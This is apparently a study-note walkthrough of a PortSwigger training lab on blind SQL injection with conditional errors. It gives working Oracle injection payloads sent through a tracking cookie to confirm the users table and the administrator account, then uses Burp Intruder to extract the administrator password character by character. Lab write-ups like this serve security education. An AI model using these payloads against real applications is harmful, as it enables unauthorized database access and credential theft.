## Error-based SQL injection
- where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts.
- The possibilities depend largely on the configuration of the database and the types of errors you're able to trigger.

### Exploiting blind SQL injection by triggering conditional errors
- Very often, an unhandled error thrown by the database will cause some difference in the application's response (such as an error message), allowing us to infer the truth of the injected condition.
- This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false

- To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
```
- These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true.
- With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error. With the second input, it evaluates to `1/0`, which causes a divide-by-zero error. 
- Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true.

- Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:
```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

## Steps to solve Lab-1
### Desc - Blind SQL injection with conditional errors
### Pre-requisite - [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

1. First confirm that the parameter(tracking-id) is vulnerable to blind SQLi
Vulnerable parameter - tracking cookie(tracking-id)
**Below is how the backend query looks like when it checks the user is known or not known** ->
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8'
```

**Note** - If the SQL query causes an error, then the application returns a custom error message.

**Checking the above note by putting single quote**
![[blind_SQL_injection_conditional_errors3.png]]
From above we can clearly say that it is vulnerable to sql injection.

2. Now, we need to check the version of the database used:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT '') || '
```

Below performing on burp:
![[blind_SQL_injection_conditional_errors1.png]]
- We need to use "FROM" keyword along with the oracle built-in table which is "dual".

query - 
```sql 
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT '' FROM dual) || '
```

Below performing on burp:
![[blind_SQL_injection_conditional_errors2.png]]
**Result** - Database is oracle.

3. Now, we are going to confirm that the **users** table exist in the database.
query -
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT '' FROM users) || '
```

Below performing on burp:
![[blind_SQL_injection_conditional_errors4.png]]
**Reason** - The **users** table might be have more than one entry, which just break our query. that's why we need to define that to output only one row from **users** table.

query - 
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT '' FROM users WHERE rownum=1) || '
```

Below performing on burp again:
![[blind_SQL_injection_conditional_errors5.png]]
**Result** - `users` does exist in database.

4. Now, we are going to confirm that **administrator** user exist in the database.
query - 
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT '' FROM users WHERE username=administrator) || '
```

Below performing on burp:
![[blind_SQL_injection_conditional_errors6.png]]
However, this wouldn't really tell you that **administrator** user exist.
**Reason** - When you search for any other and that user doesn't even exist then this query doesn't even run the **SELECT** statement code and give **200** status code.
![[blind_SQL_injection_conditional_errors7.png]]
user - a23strasdfator but the resulted status code is **200**.

**We need to check the existence of administrator user on the basis of  generating error messages**
query - 
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
```
**Explaination to above query**
The **FROM** clause evaluates first and then **SELECT** clause evaluate. So, the **FROM** clause is wrong(doesn't give you any result) then **SELECT** clause doesn't even evaluates.
**For the above query** - If the `administrator` user exist then **SELECT** clause run otherwise it doesn't even run.

##### Checking the existence of administrator user with the above query
query - 
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
```

Below performing on burp:
![[blind_SQL_injection_conditional_errors8.png]]
Now, we need to make sure that the **SELECT** clause is running or not by just changing **(1=1)** to **(1=0)**. So that we can get **200** status code
![[blind_SQL_injection_conditional_errors9.png]]
**Result** - administrator user is exist in the database.

**Let's with the user that doesn't exist**
![[blind_SQL_injection_conditional_errors10.png]]
**Reason** - We get **200** status code because **SELECT** doesn't even evaluates and also the reason is because this **asdf23XXX** doesn't even exist in the database.

5. Now, we are going to determine the length of the password.
query -
```sql 
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)>1) || '
```
We are going to perform the above step on intruder because it help us to perform brute force.

Below performing on burp:
1. Checking the length of password on **Repeater**:
![[blind_SQL_injection_conditional_errors11.png]]
**Reason for 200 status code** - **SELECT** clause doesn't even run because **FROM** clause is wrong.

2. Sending the query to intruder:
![[blind_SQL_injection_conditional_errors12.png]]

3. Seting up the positions in the position section of intruder
![[blind_SQL_injection_conditional_errors13.png]]

4. Setting up the payload. 
![[blind_SQL_injection_conditional_errors14.png]]

5. Setting up the Grep section to grab the password length on the basis of "Internal Server Error".
![[blind_SQL_injection_conditional_errors15.png]]
start the attack.

6. Performing brute forcing attack to gather the information about length of password.
![[blind_SQL_injection_conditional_errors16.png]]
**Result** - The length of administrator password is exactly 20.

6. Now, we are going to determine each character of password.
query -->
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and substr(password,1,1)='a') || '
```
The iterative approach is so lengthy and time consuming so, we are going to use **intruder** to do above brute forcing.

Below performing on burp:
1. Sending the **Repeater** data to **Intruder**:
![[blind_SQL_injection_conditional_errors17.png]]

2. Setting up the first payload:
![[blind_SQL_injection_conditional_errors19.png]]

3. Setting up the second payload to brute-force the password characters:
![[blind_SQL_injection_conditional_errors20.png]]

4. Setting up the **Grep** to grab the **Internal Server Error** message responses:
![[blind_SQL_injection_conditional_errors21.png]]
Start the attack.

5. Brute-forcing stage:
![[blind_SQL_injection_conditional_errors22.png]]
**Result** - password of administrator is "s0s181epsxf77yn2qmn6"

6. Try to login as administrator with the above password and then you solved the lab:
![[blind_SQL_injection_conditional_errors23.png]]
